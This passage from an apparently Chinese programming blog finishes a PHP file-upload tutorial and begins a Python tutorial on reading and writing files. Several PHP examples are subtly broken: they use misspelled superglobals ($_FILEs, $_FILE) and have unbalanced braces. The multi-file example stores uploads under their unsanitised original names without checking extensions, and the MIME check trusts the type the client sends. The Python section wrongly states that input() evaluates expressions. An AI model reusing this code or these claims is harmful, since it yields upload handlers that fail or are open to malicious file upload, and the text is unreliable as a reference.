class="comment">导致文件不可用或上传的文件不符合要求。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//数组内容为允许上传的mime类型</span></span><br><span class="line"><span class="variable">$allowMime</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;image/jpg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;image/jpeg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;image/pjpeg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;image/gif&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>], <span class="variable">$allowMime</span>))&#123;                      </span><br><span class="line">	<span class="comment">//判断上传文件的mime类型是否在允许的范围内</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;文件格式不正确，请检查&#x27;</span>);</span><br><span class="line">    <span class="comment">//如果不在允许范围内，退出上传并返回错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-4-生成指定的路径和文件名"><a href="#3-4-生成指定的路径和文件名" class="headerlink" title="3.4 生成指定的路径和文件名"></a><font color="#3CB371" face="Comic sans MS">3.4 生成指定的路径和文件名</font></h4><p>我们的文件上传成功了，不会让它保存原名。<br>因为，有些人在原名中有敏感关键词会违反我国的相关法律和法规。<br>我们可以采用<font color="#FF7F00">date()、mt_rand()</font>或者<font color="#FF7F00">unique()</font>生成随机的文件名。</p>
<blockquote>
<ol>
<li><font color="#FF7F00"><strong>$_FILES[“file”][“tmp_name”]：</strong></font>文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</li>
<li>按照项目的文件安排，生成文件存储路径，为了避免文件名重复而产生的错误，按照一定的格式，生成一个随机文件名。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//指定上传文件夹</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;upload/images/&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">根据当前时间生成随机文件名，本行代码是使用当前时间 + 随机一个0-9的数字组合成文件名，后缀即为前面取到的文件后缀名</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$name</span> = date(<span class="string">&#x27;Y&#x27;</span>).date(<span class="string">&#x27;m&#x27;</span>).date(<span class="string">&quot;d&quot;</span>).date(<span class="string">&#x27;H&#x27;</span>).date(<span class="string">&#x27;i&#x27;</span>).date(<span class="string">&#x27;s&#x27;</span>).rand(<span class="number">0</span>,<span class="number">9</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$myImgSuffix</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-5-判断是否是上传文件"><a href="#3-5-判断是否是上传文件" class="headerlink" title="3.5  判断是否是上传文件"></a><font color="#3CB371" face="Comic sans MS">3.5  判断是否是上传文件</font></h4><p>使用函数：<font color=red><strong>is_uploaded_file()</strong></font></p>
<blockquote>
<ol>
<li>文件上传成功时，系统会将上传的临时文件上传到系统的临时目录中。产生一个临时文件。</li>
<li>同时会产生临时文件名。我们需要做的事情是将临时文件移动到系统的指定目录中。</li>
<li>而移动前不能瞎移动，或者移动错了都是不科学的。移动前我们需要使用相关函数判断上传的文件是不是临时文件。</li>
<li><font color="#FF7F00"><strong>is_uploaded_file()</strong></font>传入一个参数($_FILES中的缓存文件名)，判断传入的名称是不是上传文件。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>is_uploaded_file()函数是专用的函数，来判断目标文件是否是上传文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用is_uploaded_file()判断是否是上传文件,函数介绍见上文</span></span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-6-移动临时文件到指定位置"><a href="#3-6-移动临时文件到指定位置" class="headerlink" title="3.6  移动临时文件到指定位置"></a><font color="#3CB371" face="Comic sans MS">3.6  移动临时文件到指定位置</font></h4><p>使用函数：<font color=red><strong>move_uploaded_file()</strong></font>和数组元素：<font color=red><strong>$_FILES[“file”][“tmp_name”]</strong></font></p>
<blockquote>
<ol>
<li>临时文件是真实的临时文件，我们需要将其移动到我们的网站目录下面,让我们网站目录的数据，其他人可以访问到。</li>
<li>我们使用：<font color="#FF7F00">move_uploaded_file()</font>。<br>这个函数是<font color="#FF7F00">**将上传文件移动到指定位置，并命名</font>**。<br>传入两个参数：<br>第一个参数是指定移动的上传文件；<br>第二个参数是指定的文件夹和名称拼接的字符串。</li>
<li>需要注意的是，Linux系统中对目标目录是否有权限及磁盘空间是否足够，否则会导致上传操作失败。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">使用move_uploaded_file()移动上传文件至指定位置,第一个参数为上传文件，第二个参数为我们在前面指定的上传路径和名称。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$path</span>.<span class="variable">$name</span>))&#123;</span><br><span class="line">           <span class="comment">//提示文件上传成功</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>;                                </span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">文件移动失败，检查磁盘是否有足够的空间，或者linux类系统中文件夹是否有足够的操作权限</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>;                                                </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;不是上传文件&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四-多文件上传"><a href="#四-多文件上传" class="headerlink" title="四. 多文件上传"></a><font color="#FF6347" face="Comic sans MS">四. 多文件上传</font></h3><p>多文件上传原理相同，<font color="#FF7F00"><strong>不过在处理数据时，需要对上传数据进行特殊处理</strong>。</font></p>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">title</span>&gt;</span>单文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;morefile.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file[]&quot;</span>&gt;</span>  //name比单文件上传时多了[]</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file[]&quot;</span>&gt;</span>  //name比单文件上传时多了[]</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里是一个简易的上传页面，form表单同时提交了两个文件。我们 可以通过这个页面提交内容。<br><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li>input type&#x3D;”file” name&#x3D;”file[]”与之前相比file后<font color="#FF7F00"><strong>多加了一个中括号</strong></font></li>
<li>写了2个或者多个input type&#x3D;”file” name&#x3D;”file[]”<br>我们使用 $_FILES 来接收文件信息，打印并查看数组：</li>
</ol>
<p><font color="#FF7F00"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">var_dump(<span class="variable">$_FILES</span>); <span class="comment">//打印$_FILES查看数组结构 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出如下：</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)  </span><br><span class="line">    <span class="string">&#x27;file&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">5</span>) </span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">        <span class="comment">//文件名 </span></span><br><span class="line">        <span class="number">0</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;psu.jpg&#x27;</span> (length=<span class="number">7</span>) </span><br><span class="line">        <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;qwe.jpg&#x27;</span> (length=<span class="number">7</span>) </span><br><span class="line">    <span class="comment">//文件mime类型 </span></span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">            <span class="number">0</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;image/jpeg&#x27;</span> (length=<span class="number">10</span>) </span><br><span class="line">            <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;image/jpeg&#x27;</span> (length=<span class="number">10</span>) </span><br><span class="line">    <span class="comment">//缓存文件 </span></span><br><span class="line">    <span class="string">&#x27;tmp_name&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">            <span class="number">0</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;E:\wamp\tmp\phpF6D5.tmp&#x27;</span> (length=<span class="number">23</span>) </span><br><span class="line">            <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;E:\wamp\tmp\phpF6F5.tmp&#x27;</span> (length=<span class="number">23</span>) </span><br><span class="line">    <span class="comment">//文件错误信息 </span></span><br><span class="line">    <span class="string">&#x27;error&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">            <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">0</span> </span><br><span class="line">            <span class="number">1</span> =&gt; <span class="keyword">int</span> <span class="number">0</span> </span><br><span class="line">    <span class="comment">//文件大小 </span></span><br><span class="line">    <span class="string">&#x27;size&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">        <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">225824</span>     </span><br><span class="line">        <span class="number">1</span> =&gt; <span class="keyword">int</span> <span class="number">151651</span></span><br></pre></td></tr></table></figure>


<blockquote>
<ol>
<li>我们可以看到，两个文件被存储在一个数组中，<font color="#FF7F00"><strong>键名和上传单文件是相同</strong></font>。所以，需要我们for()循环，来分别取出两个文件的需要用到的数据。</li>
<li>在$_FILES中同时保存了两个文件的数据，我们需要使用一个简单的循环，来读取单个文件的信息，并将文件移动到我们想要放的位置。</li>
</ol>
</blockquote>
<p>&amp;emsp;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$_FILE</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="variable">$i</span>++) &#123;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">用is_uploaded_file()函数判断是上传文件 </span></span><br><span class="line"><span class="comment">并且没有出现错 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(is_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$i</span>]) &amp;&amp; <span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>][<span class="variable">$i</span>] == <span class="number">0</span>)&#123;     </span><br><span class="line">       <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$i</span>],<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$_FILE</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>][<span class="variable">$i</span>]))&#123;</span><br><span class="line">   <span class="comment">//用move_uploaded_file()函数移动文件到指定的位置并使用文件原名 </span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>; </span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">else</span>&#123; </span><br><span class="line"></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>; </span><br><span class="line"></span><br><span class="line">       &#125; </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">else</span>&#123; </span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>; </span><br><span class="line"></span><br><span class="line">   &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五-单文件上传完整代码"><a href="#五-单文件上传完整代码" class="headerlink" title="五. 单文件上传完整代码"></a><font color="#FF6347" face="Comic sans MS">五. 单文件上传完整代码</font></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line"> <span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]) &#123;</span><br><span class="line"> <span class="comment">//错误码不为0，即文件上传过程中出现了错误</span></span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件过大&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件超出指定大小&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;只有部分文件被上传&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件没有被上传&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;找不到指定文件夹&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件写入失败&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">default</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;上传出错&lt;br/&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$MAX_FILE_SIZE</span> = <span class="number">100000</span>;</span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$MAX_FILE_SIZE</span>) &#123;</span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&quot;文件超出指定大小&quot;</span>);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$allowSuffix</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;jpg&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gif&#x27;</span>,</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="variable">$myImg</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$myImgSuffix</span> = array_pop(<span class="variable">$myImg</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!in_array(<span class="variable">$myImgSuffix</span>, <span class="variable">$allowSuffix</span>)) &#123;</span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&quot;文件后缀名不符&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$allowMime</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&quot;image/jpg&quot;</span>,</span><br><span class="line"> <span class="string">&quot;image/jpeg&quot;</span>,</span><br><span class="line"> <span class="string">&quot;image/pjpeg&quot;</span>,</span><br><span class="line"> <span class="string">&quot;image/gif&quot;</span>,</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>], <span class="variable">$allowMime</span>)) &#123;</span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&#x27;文件格式不正确，请检查&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$path</span> = <span class="string">&quot;upload/images/&quot;</span>;</span><br><span class="line"> <span class="variable">$name</span> = date(<span class="string">&#x27;Y&#x27;</span>) . date(<span class="string">&#x27;m&#x27;</span>) . date(<span class="string">&quot;d&quot;</span>) . date(<span class="string">&#x27;H&#x27;</span>) . date(<span class="string">&#x27;i&#x27;</span>) . date(<span class="string">&#x27;s&#x27;</span>) . rand(<span class="number">0</span>, <span class="number">9</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$myImgSuffix</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (is_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$path</span> . <span class="variable">$name</span>)) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;不是上传文件&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-文件系统</title>
    <url>/post/Python-FileContents/</url>
    <content><![CDATA[<p>Python是 文件对象.write()，PHP是fwrite() 😀…</p>
<span id="more"></span>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>文件系统</font> </center>

<p>推荐参考资料：<br><font color="#00B2EE">《<a href="http://www.runoob.com/python3/python3-inputoutput.html">Python3 输入和输出</a>》</font><br><font color="#00B2EE">《<a href="https://www.cnblogs.com/sjie0224/articles/7562509.html">Python学习之路-11 (文件操作)</a>》</font> </p>
<br>

<br>

<h3 id="一-读写文件"><a href="#一-读写文件" class="headerlink" title="一. 读写文件"></a><font color="#FF6347" face="Comic sans MS">一. 读写文件</font></h3><p>Python提供了 input() 内置函数从标准输入读入一行文本，并将输入以字符串形式返回，默认的标准输入是键盘。</p>
<p>input 可以接收一个Python表达式作为输入，并将运算结果返回。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&quot;请输入：&quot;</span>);</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;你输入的内容是: &quot;</span>, <span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">这会产生如下的对应着输入的结果：</span><br><span class="line">请输入：菜鸟教程</span><br><span class="line">你输入的内容是:  菜鸟教程</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p><font color="#00B2EE"><strong>使用到的方法：</strong></font></p>
</blockquote>
<ul>
<li><font color="#FF7F00"><strong>open()：</strong></font> 以某种读写模式打开一个文件，将会返回一个 file 对象；</li>
<li><font color="#FF7F00"><strong>f.write(string) ：</strong></font> 将 string 写入到文件中, 然后返回写入的字符数；</li>
<li><font color="#FF7F00"><strong>f.read(size)：</strong></font> 将读取一定数目的数据, 然后作为字符串或字节对象返回；</li>
<li><font color="#FF7F00"><strong>f.readline() ：</strong></font> 从文件读取整行，包括 “\n” 字符。如果指定了一个非负数的参数，则返回指定大小的字节数，包括 “\n” 字符。；</li>
<li><font color="#FF7F00"><strong>f.readlines() ：</strong></font> 将返回该文件中包含的所有行；</li>
<li><font color="#FF7F00"><strong>f.tell() ：</strong></font> 返回文件对象当前所处的位置, 它是从文件开头开始算起的<strong>字节数</strong>；</li>
<li><font color="#FF7F00"><strong>f.seek() ：</strong></font> 如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数；</li>
<li><font color="#FF7F00"><strong>f.close() ：</strong></font> 当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，如果尝试再调用该文件，则会抛出异常。</li>
</ul>
<br>


<br>

<h4 id="1-1-open"><a href="#1-1-open" class="headerlink" title="1.1 open()"></a><font color="#3CB371" face="Comic sans MS">1.1 open()</font></h4><p>Python open() 方法用于打开一个文件，并<font color="#FF7F00"><strong>返回文件对象</strong></font>，在对文件进行处理过程都需要使用到这个函数，如果该文件无法被打开，会抛出 OSError。</p>
<p><strong>注意：</strong>使用 open() 方法一定要保证关闭文件对象，即调用 close() 方法。</p>
<p>open() 函数常用形式是接收两个参数：<strong>文件名(file)和模式(mode)<strong>。即</strong><code>a = open(file, mode); </code></strong></p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">open(file, mode, buffering, encoding&#x3D;None, <br>&amp;emsp;&amp;emsp;&amp;emsp;errors&#x3D;None, newline&#x3D;None, <br>&amp;emsp;&amp;emsp;&amp;emsp;closefd&#x3D;True, opener&#x3D;None)</td>
<td align="left">file: 必需，文件路径（相对或者绝对路径）。<br>mode: 可选，文件打开模式<br>buffering: 设置缓冲<br>encoding: 一般使用utf8<br>errors: 报错级别<br>newline: 区分换行符<br>closefd: 传入的file参数类型<br>opener:</td>
<td align="left">文件对象</td>
</tr>
</tbody></table>
<br>

<p><font color="#FF7F00"><strong>mode 参数有：</strong></font></p>
<table>
<thead>
<tr>
<th align="left">模式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">t</td>
<td align="left">文本模式 (默认)。</td>
</tr>
<tr>
<td align="left">x</td>
<td align="left">写模式，新建一个文件，如果该文件已存在则会报错。</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">二进制模式。</td>
</tr>
</tbody></table>
<ul>
<li>|打开一个文件进行<strong>更新(可读可写)<strong>。<br>U    |通用换行模式（不推荐）。<br>r    |以</strong>只读方式</strong>打开文件。文件的指针将会放在<strong>文件的开头</strong>。这是默认模式。<br>rb    |以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。<br>一般用于非文本文件如图片等。<br>r+    |打开一个文件<strong>用于读写</strong>。文件指针将会放在文件的<strong>开头</strong>。<br>rb+    |以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。<br>w    |打开一个文件<strong>只用于写入</strong>。如果该文件已存在则打开文件，并从开头开始编辑，即<strong>原有内容会被删除</strong>。<br>如果该文件不存在，创建新文件。<br>wb    |以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有<br>内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。<br>w+    |打开一个文件用于<strong>读写</strong>。如果该文件已存在则打开文件，并<strong>从开头开始编辑</strong>，<strong>即原有内容会被删除</strong>。<br>如果该文件不存在，创建新文件。<br>wb+    |以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，<br>即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。<br>a    |打开一个文件用于<strong>追加(不能读)<strong>。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，<br>新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。<br>ab    |以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，<br>新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。<br>a+    |打开一个文件用于</strong>读写</strong>。如果该文件已存在，文件<strong>指针将会放在文件的结尾</strong>。<br>文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。<br>ab+    |以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。<br>如果该文件不存在，创建新文件用于读写。</li>
</ul>
<br>

<p>下图很好的总结了这几种模式：</p>
<p><img data-src="https://i.loli.net/2019/03/06/5c7fb64577036.png" alt="2.png"></p>
<br>

<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="center">读</th>
<th align="center">写</th>
<th align="center">创建</th>
<th align="center">覆盖</th>
<th align="center">指针在开始</th>
<th align="center">指针在结尾</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>r</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>r+</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>w</strong></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>w+</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>a</strong></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
</tr>
<tr>
<td align="center"><strong>a+</strong></td>
